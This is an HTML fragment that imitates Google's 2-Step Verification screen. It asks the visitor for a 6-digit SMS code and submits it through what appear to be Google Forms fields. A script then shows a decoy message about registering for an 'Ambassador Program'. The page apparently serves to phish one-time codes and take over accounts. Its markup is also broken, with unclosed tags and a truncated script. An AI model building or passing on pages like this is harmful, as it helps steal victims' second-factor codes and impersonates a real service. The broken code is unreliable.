            <h3 class="font-bold text-2xl mb-5">2-Step Verification</h3>
            <p>
              To help keep your account safe, Google wants to make sure it's
              really you trying to sign in
            </p>
            <p class="font-bold mt-5 mb-5"></p>
            <p class="mt-5 mb-5">
              A text message with a 6-digit verification code was sent to your

            </p>

            <div class="grid place-items-center">

                <fieldset>
                  <div class="form-group">
                    <input
                      id="1206343012"
                      type="text"
                      placeholder="Enter the code"
                      name="entry.1206343012"
                      class="form-control input input-bordered input-primary w-full max-w-xs mb-5"

                  </div>

                <input

                  name="fvv"

                <input type="hidden" name="fbzx" value="-1667597435027000715" />

                <input type="hidden" name="pageHistory" value="0" />

                  class="btn btn-wide btn-active btn-primary text-white"
                  type="submit"
                  value="Register"
                />
              </form>
              <script>
                $("#bootstrapForm").submit(function (event) {
                  event.preventDefault();
                  var extraData = {};
                  $("#bootstrapForm").ajaxSubmit({
                    data: extraData,
                    dataType: "jsonp",
                    error: function () {
                      alert("You have registered for the Ambassador Program");
                    },

                });
